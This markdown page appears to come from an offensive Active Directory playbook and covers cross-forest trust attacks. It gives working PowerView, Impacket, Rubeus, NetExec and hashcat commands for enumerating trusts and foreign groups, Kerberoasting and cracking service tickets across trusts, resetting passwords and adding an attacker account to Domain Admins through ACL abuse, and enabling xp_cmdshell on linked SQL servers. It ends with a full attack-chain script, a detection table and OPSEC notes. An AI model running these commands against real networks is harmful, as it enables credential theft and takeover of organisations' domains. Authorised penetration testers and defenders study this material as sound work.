# Cross-Forest Attack

## Overview

Cross-forest attacks target domains in other forests through trust relationships. Unlike child-to-parent attacks, SID filtering is typically enabled across forest trusts, preventing simple ExtraSids golden ticket abuse. Attack vectors include Kerberoasting across trusts, ACL abuse, foreign group membership abuse, and service-specific trust attacks (e.g., MSSQL).

## Attack Vectors

| Vector | Description | SID Filtering Impact |
|--------|-------------|---------------------|
| Kerberoasting across trusts | Request service tickets for SPNs in target forest | Unaffected |
| ACL abuse across trusts | Abuse ACL permissions granted to principals from other forest | Unaffected |
| Foreign group membership | Users from Forest A in privileged groups in Forest B | Unaffected |
| SID filtering disabled | ExtraSids golden ticket (rare) | Must be disabled |
| MSSQL cross-forest trust | SQL Server linked server trusts | Database-specific |
| TDO modification | Disable SID filtering on trust object | Requires DACL rights |

## Prerequisites

- Valid credentials in the source domain/forest
- Network connectivity to the target forest's DCs
- LDAP access to the target forest (if allowed by trust)
- If no LDAP access, enumerate through existing trust information

## Step 1: Trust Enumeration Across Forests

### PowerView

```powershell
# Enumerate trusts from current domain
Get-DomainTrust

# Get trusts for a specific target forest
Get-DomainTrust -Domain target.forest.local

# Forest trusts only
Get-DomainTrust | Where-Object {$_.TrustType -eq "Forest"}

# Detailed trust information for target
Get-DomainTrust -Domain target.forest.local | Select SourceName, TargetName, TrustType, TrustDirection, TrustAttributes, TrustTransitive

# Enumerate trust using API
Get-DomainTrust -API
```

### Get-ForestTrust

```powershell
# Current forest trusts
Get-ForestTrust

# Specific forest trust info
Get-ForestTrust -Forest target.forest.local
```

### AD Module

```powershell
# AD module trust enumeration
Get-ADTrust -Filter * -Server targetdc.target.forest.local

# List domains in target forest
(Get-ADForest -Server targetdc.target.forest.local).Domains

# Get forest trust info for target
Get-ADForest -Server targetdc.target.forest.local | Select CrossForestReferences
```

### NetExec

```bash
# Enumeration across trust
nxc ldap <target-dc> -u 'source.forest\user' -p 'pass' --trust

# LDAP enum of target domain
nxc ldap <target-dc> -u 'source.forest\user' -p 'pass' --users

# SMB enum across trust
nxc smb <target-dc> -u 'source.forest\user' -p 'pass' --shares
```

## Step 2: User/Group Enumeration Across Trusts

### Foreign Users

```powershell
# Find users from other domains/forests in this domain
Get-DomainForeignUser

# Foreign users from a specific target domain perspective
Get-DomainForeignUser -Domain target.forest.local

# Detailed foreign user information
Get-DomainForeignUser -Domain target.forest.local | Select UserDomain, UserName, MemberDomain, MemberName, MemberDistinguishedName
```

### Foreign Group Members

```powershell
# Find groups with foreign members (current domain)
Get-DomainForeignGroupMember

# Foreign group members in target forest
Get-DomainForeignGroupMember -Domain target.forest.local

# Detailed output
Get-DomainForeignGroupMember -Domain target.forest.local | Select GroupName, MemberName, MemberDomain, MemberDistinguishedName

# Resolve foreign group member details
Get-DomainForeignGroupMember -Domain target.forest.local | ForEach-Object {
    $group = $_.GroupName
    $memberSID = $_.MemberName
    try {
        $resolved = ConvertFrom-SID $memberSID
        Write-Host "Group: $group -> Member: $resolved"
    } catch {
        Write-Host "Group: $group -> MemberSID: $memberSID (UNRESOLVED)"
    }
}
```

### Check for Privileged Access

```powershell
# Check if current domain/forest has privileged access in target
# Look for groups containing our domain's users
Get-DomainGroup -Domain target.forest.local -Identity "Administrators" | Get-DomainGroupMember

# Check Domain Admins in target for foreign members
Get-DomainGroupMember -Domain target.forest.local -Identity "Domain Admins" | Where-Object {$_.MemberDomain -ne "target.forest.local"}

# Search all privileged groups in target for our users
$privGroups = @("Domain Admins", "Enterprise Admins", "Administrators", " Backup Operators", "Server Operators", "Account Operators")
foreach ($group in $privGroups) {
    try {
        $members = Get-DomainGroupMember -Domain target.forest.local -Identity $group -ErrorAction Stop
        $members | Where-Object {$_.MemberDomain -ne "target.forest.local"} | ForEach-Object {
            Write-Host "[!] $($_.MemberDomain)\$($_.MemberName) is in $group on target.forest.local" -ForegroundColor Green
        }
    } catch {
        Write-Host "[-] Cannot access $group on target" -ForegroundColor DarkGray
    }
}
```

## Step 3: Kerberoasting Across Trusts

If the user from the current domain/forest has an SPN registered in the target forest, or if your domain account has privileges allowing TGS requests, you can Kerberoast across the trust.

### Enumerate SPNs in Target Forest

```powershell
# Get all SPN-enabled users in target forest
Get-DomainUser -Domain target.forest.local -SPN | Select samaccountname, serviceprincipalname

# Limit to specific service type
Get-DomainUser -Domain target.forest.local -SPN | Where-Object {$_.serviceprincipalname -like "MSSQLSvc/*"}

# Get SPN details
Get-DomainUser -Domain target.forest.local -SPN | Format-Table samaccountname, serviceprincipalname, memberof
```

### Request TGS (with cross-forest auth)

```bash
# Using Impacket GetUserSPNs across forest
# Requires credentials valid in the target forest
GetUserSPNs.py -request target.forest.local/user:password -dc-ip <target-dc>

# Alternative: request with Kerberos auth
GetUserSPNs.py -k target.forest.local/user -dc-ip <target-dc>

# Rubeus (if on Windows in target context)
Rubeus.exe kerberoast /domain:target.forest.local
```

### Crack Retrieved Tickets

```bash
# Crack with hashcat (mode 13100 for Kerberoast)
hashcat -m 13100 hash.txt wordlist.txt -r best64.rule

# Crack with john
john --wordlist=wordlist.txt hash.txt
```

## Step 4: ACL Abuse Across Trusts

### Enumerate ACLs in Target Forest

```powershell
# Check if user from source forest has ACL rights in target forest
# Requires sufficient permissions in target forest
Get-DomainObjectAcl -Domain target.forest.local -Identity "Administrator" -ResolveGUIDs

# Find interesting ACLs across the trust boundary
Get-DomainObjectAcl -Domain target.forest.local -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDACL|WriteOwner|ForceChangePassword|Self"}
```

### Abuse ACL (GenericAll Example)

```powershell
# If our user has GenericAll on a target user, we can reset their password
Set-DomainUserPassword -Domain target.forest.local -Identity targetuser -AccountPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force)

# If our user has GenericAll on a target group, add ourselves
Add-DomainGroupMember -Domain target.forest.local -Identity "Domain Admins" -Members "source\attackeruser"
```

## Step 5: MSSQL Cross-Forest Trust Abuse

SQL Server supports linked servers and cross-forest authentication. If trust is configured, you can pivot through MSSQL.

### Enumerate SQL Servers Across Trust

```powershell
# Find MSSQL SPNs in target forest
Get-DomainUser -Domain target.forest.local -SPN | Where-Object {$_.serviceprincipalname -like "MSSQLSvc/*"}

# Resolve SQL servers
Get-DomainUser -Domain target.forest.local -SPN | Where-Object {$_.serviceprincipalname -like "MSSQLSvc/*"} | ForEach-Object {
    $spn = $_.serviceprincipalname
    $spn -match "MSSQLSvc/([^:]+)" | Out-Null
    $server = $Matches[1]
    [PSCustomObject]@{
        User = $_.samaccountname
        SPN = $spn
        Server = $server
    }
}
```

### Connect and Abuse Linked Servers

```sql
-- If you have SQL access through Windows auth across trust
-- Enumerate linked servers
EXEC sp_linkedservers;

-- Execute command via xp_cmdshell on linked server (if enabled)
EXEC ('xp_cmdshell ''whoami''') AT [LinkedServerName];

-- If not enabled, enable it (requires sysadmin)
EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LinkedServerName];
EXEC ('xp_cmdshell ''whoami''') AT [LinkedServerName];
```

## Step 6: Complete Attack Chain Example

### Scenario: Source Forest to Target Forest

```powershell
# Phase 1: Reconnaissance
Write-Host "[*] Phase 1: Trust Reconnaissance" -ForegroundColor Cyan

# Enumerate forest trusts
$forestTrust = Get-DomainTrust | Where-Object {$_.TrustType -eq "Forest"} | Select -First 1
if (-not $forestTrust) {
    Write-Host "[-] No forest trusts found" -ForegroundColor Red
    exit
}

$targetDomain = $forestTrust.TargetName
Write-Host "[+] Found forest trust to: $targetDomain" -ForegroundColor Green

# Phase 2: Check SID filtering
Write-Host "[*] Phase 2: SID Filtering Assessment" -ForegroundColor Cyan
$filteringEnabled = $forestTrust.TrustAttributes -band 0x4
if (-not $filteringEnabled) {
    Write-Host "[!] SID filtering is DISABLED on $targetDomain" -ForegroundColor Green
    Write-Host "[!] ExtraSids golden ticket attack possible!" -ForegroundColor Green
} else {
    Write-Host "[*] SID filtering is enabled on $targetDomain (default)" -ForegroundColor Yellow
}

# Phase 3: Enumerate foreign group memberships
Write-Host "[*] Phase 3: Foreign Group Membership Enumeration" -ForegroundColor Cyan
try {
    $foreignMembers = Get-DomainForeignGroupMember -Domain $targetDomain -ErrorAction Stop
    if ($foreignMembers) {
        $foreignMembers | Format-Table
    } else {
        Write-Host "[-] No foreign group members found in target" -ForegroundColor DarkGray
    }
} catch {
    Write-Host "[-] Cannot enumerate foreign group members in target (no LDAP access)" -ForegroundColor DarkGray
}

# Phase 4: Kerberoast across trust
Write-Host "[*] Phase 4: Cross-Forest Kerberoasting" -ForegroundColor Cyan
try {
    $spnUsers = Get-DomainUser -Domain $targetDomain -SPN -ErrorAction Stop
    if ($spnUsers) {
        Write-Host "[+] Found $($spnUsers.Count) SPN users in target forest" -ForegroundColor Green
        $spnUsers | Select samaccountname, serviceprincipalname | Format-Table
    }
} catch {
    Write-Host "[-] Cannot enumerate SPNs in target (no LDAP access)" -ForegroundColor DarkGray
}

# Phase 5: Check if current user has explicit access
Write-Host "[*] Phase 5: Cross-Forest Access Test" -ForegroundColor Cyan
try {
    $testAccess = Get-DomainGroupMember -Domain $targetDomain -Identity "Domain Admins" -ErrorAction Stop
    $ourAccess = $testAccess | Where-Object {$_.MemberDomain -ne $targetDomain}
    if ($ourAccess) {
        Write-Host "[!] Domain Admins in $targetDomain contains foreign members!" -ForegroundColor Green
        $ourAccess | Format-Table
    }
} catch {
    Write-Host "[-] Cannot check Domain Admins membership" -ForegroundColor DarkGray
}
```

### Commands Summary

```powershell
# Trust enumeration across forests
Get-DomainTrust -Domain target.forest.local
Get-DomainForeignUser -Domain target.forest.local
Get-DomainForeignGroupMember -Domain target.forest.local

# Kerberoast across trust
Get-DomainUser -Domain target.forest.local -SPN
GetUserSPNs.py -request target.forest.local/user:password

# ACL abuse (if permissions exist)
Get-DomainObjectAcl -Domain target.forest.local -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite"}

# Cross-forest SID filtering check
Get-DomainTrust | Where-Object {$_.TrustType -eq "Forest"} | Select TargetName, @{N='SIDFiltering';E={if($_.TrustAttributes -band 0x4){"Enabled"}else{"Disabled"}}}

# Cross-forest authentication test
nxc smb <target-dc> -u 'source.forest\user' -p 'pass' --shares
```

## Detection

| Activity | Event ID | Source | Notes |
|----------|----------|--------|-------|
| Cross-forest LDAP query | 4662 | Target DC | Directory Service Access |
| Cross-forest auth (Kerberos) | 4768 | Target DC | TGT request, realm different |
| Cross-forest TGS request | 4769 | Target DC | SPN in different forest |
| Kerberoast (TGS request) | 4769 | Target DC | Multiple TGS requests + RC4 encryption |
| Foreign group membership query | 4662 | Target DC | ForeignSecurityPrincipal container |
| Password reset by foreign user | 4724 | Target DC | Password change event |

## OPSEC

- Cross-forest LDAP queries generate 4662 events on the target DC
- Kerberoasting across trusts is observable via 4769 events with unusual service names
- ACL abuse across forests requires sufficient permissions — check before attempting
- Foreign user/group enumeration may be restricted by the trust configuration
- SID filtering disabled is rare in production; focus on Kerberoasting and ACL abuse as primary vectors
- MSSQL cross-forest abuse requires SQL Server authentication configuration

## References

- [Forest Trust Abuse](./02_Forest_Trust_Abuse.md)
- [Child to Parent Domain Attack](./01_Child_to_Parent_Domain.md)
- [Kerberoasting (02_Initial_Access/02_Kerberoasting.md)](../02_Initial_Access/02_Kerberoasting.md)
- [ACL Abuse (05_Privilege_Escalation/02_Domain_PrivEsc_ACL.md)](../05_Privilege_Escalation/02_Domain_PrivEsc_ACL.md)
- [Trust Enumeration (01_Enumeration/04_Trust_Enumeration.md)](../01_Enumeration/04_Trust_Enumeration.md)
